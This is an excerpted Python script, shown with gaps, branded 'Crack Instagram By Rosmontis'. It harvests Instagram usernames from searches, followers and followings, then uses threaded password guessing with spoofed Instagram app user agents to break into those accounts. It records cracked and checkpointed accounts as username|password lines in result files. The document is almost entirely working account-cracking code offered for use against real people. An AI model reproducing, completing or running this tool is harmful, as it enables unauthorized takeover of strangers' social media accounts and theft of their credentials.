...
reset = "[/]"
uadia, uadarimu, prox = [], [], []
sys.stdout.write('\x1b]2; Rosmontis\x07')
...
class Instagram:
    ...
    def __init__(self):
        ...
        self.id, self.lo = [], 0
        self.gett()
        ###########self.Rosmontis = self.ses.get("https://api.countapi.xyz/hit/RayanXD/visits").json()["value"]
        self.menu()
    ...
    for xc in range(10000):
        ...
        UserAgents2 = f"Mozilla/5.0 (Linux; Android 7.1.1; Z851M Build/NMF26V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 Instagram 290.0.0.13.76 Android (25/7.1.1; 240dpi; 480x854; ZTE; Z851M; jeff; qcom; en_US; 491057537)"
        UserAgents3 = f"Mozilla/5.0 (Linux; Android 6.0.1; SM-N910F Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (23/6.0.1; 640dpi; 1440x2560; samsung; SM-N910F; trlte; qcom; pt_PT; 98288242)"
...
\t╚═══╩═══╩═══╩╝╚═╩══╩═══╝""",title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
    def logoo(self):
        ...
        prints(Panel(f"""{P2}\t
            ...
            ║╗╣║╠══║║║║║║║║║║║║╔║║╬══║
            ╚╩╩═╩══╩╩═╩╩═╩╩═╝╚╝╚══╩══╝
           Crack Instagram By Rosmontis""", title=f"{P2}{H2}{self.timeLine()}",width=80,padding=(0,4),style=f"{color_table}"))
  ...
  #      self.loadCookie(Instagram)
    ...
    def menu(self):
     ...
     #   os.popen('data/play-audio/menu.mp3')
        ...
        prints(Panel(f"{P2}[{color_rich}01{P2}]. Crack Dari Pencarian Nama {P2}[{color_rich}04{P2}]. Hapus Lisensi\n{P2}[{color_rich}02{P2}]. Dump Dari Pengikut       {P2}[{color_rich}05{P2}]. Report Bug Script\n{P2}[{color_rich}03{P2}]. Dump Dari Mengikuti      {P2}[{color_rich}00{P2}]. Keluar ({color_rich}delete cookie{P2})",width=80,padding=(0,7),style=f"{color_table}"))
        prints(Panel(f"""\t{P2}Ketik {color_rich}Menu2{P2} Pilih Salah Satu Dokutah""",width=80,padding=(0,7),style=f"{color_table}"))
        pil = input(f" {H}•{N} Pilih Menu : {H}")
        
        if pil in ["", " "]:
            print(f" {H}•{N} Pilihan Tidak Boleh Kosong dokutah")
            ...
            if nama in ["", " "]:
                print(f" {H}•{N} {M}isi dokutah  jangan kosong");time.sleep(2);self.menu()
            try:
            ...
            nama = input(f" {H}•{N} Masukan Username : {H}")
            if nama in ["", " "]:
                print(f" {H}•{N} isi dokutah  jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                prints(Panel(f"{P2}Proses Dump Username Tekan {color_rich}CTRL + C{P2} Untuk Berhenti",width=80,padding=(0,4),style=f"{color_table}"))
            ...
            if xc in ["",""]:
              print(f" {H}•{N} jangan kosong dokutah")
              time.sleep(3);self.menu()
                ...
                print(f" {H}•{N} ngetik apaan dokutah")
                time.sleep(2);self.menu()
 ...
 #           self.bots()        
        elif pil in ["menu2 dokutah","Menu2 dokutah","MENU2 DOKUTAH"]:
            self.lains()
        else:
            print(f" {H}•{N} ngetik apaan dokutah")
            time.sleep(2);self.menu()
    ...
    def lains(self):
        ...
        if ask in ["",""]:
           print(f" {H}•{N} {M}Pilihan Tidak Boleh Kosong dokutah")
           time.sleep(2);self.menu()
        elif ask in ["1","01"]:
            self.checkHasil()
        elif ask in ["2","02"]:
            ...
            prints(Panel(f"{P2}Jumlah Pengguna Script Rosmontis {color_rich}{self.Rosmontis}{P2} Orang",width=80,padding=(0,15),style=f"{color_table}"))
            time.sleep(3)
            print(f" {H}•{N} Kamu Adalah Pengguna Ke {H}{self.Rosmontis} {N}Terimakasih:)")
...
{N}[{H}+{N}] {H}LIVE{N}
 ...
 {N}├╴>{N} following : {H}{ful}{N}
                ...
                for user in self.id:
                    ...
                    for pasw in nama.split(" "):
                        ...
                        if 'satu' in method:
                           ...
                           bool.submit(self.Ngocok, usez, sandi)
            print("\r")
            prints(Panel(f" {P2}Rosmontis {color_rich}{len(self.id)} {P2}Username Selesai Hasil OK : {H2}{len(self.ok)}{P2} Hasil CP : {K2}{len(self.cp)}{P2} ",width=80,padding=(0,8),style=f"{color_table}"))
            time.sleep(3);exit()
    ...
    def crackXC(self, user, pasw):
        prog.update(des,description=f"[{H2} Rosmontis {P2}] ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
              try:
                    with requests.Session() as ses:
    ...
    def Ngocok(self, user, pasw):
        ...
        prog.update(des,description=f"Rosmontis ( {H2}stabil{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
        prog.advance(des)
        for password in pasw:
            try:
                ...
                #    os.popen('play-audio rayok.mp3')
                    print('\n')
                    prints(Panel(pepekXD,style='',title=f'\r{H2}Rosmontis OK'))
                    kntl = (f"[✓] {user}|{password}|{pengikut}|{mengikut}")
                    self.ok.append(kntl)
                    with open("results/"+akunOK,"a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    ...
                    print('\n')
             #       os.popen('play-audio raycp.mp3')
                    prints(Panel(pepekXD,style='',title=f'\r{K2}Rosmonti CP'))
                    ...
                    prog.update(des,description=f"Rosmontis ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                    time.sleep(15)
            except requests.exceptions.ConnectionError:
                prog.update(des,description=f"Rosmontis ( {M2}spam{P2} ) {str(self.lo)}/{len(self.id)} OK-:{H2}{len(self.ok)}{P2} CP-:{K2}{len(self.cp)}{P2}")
                prog.advance(des)
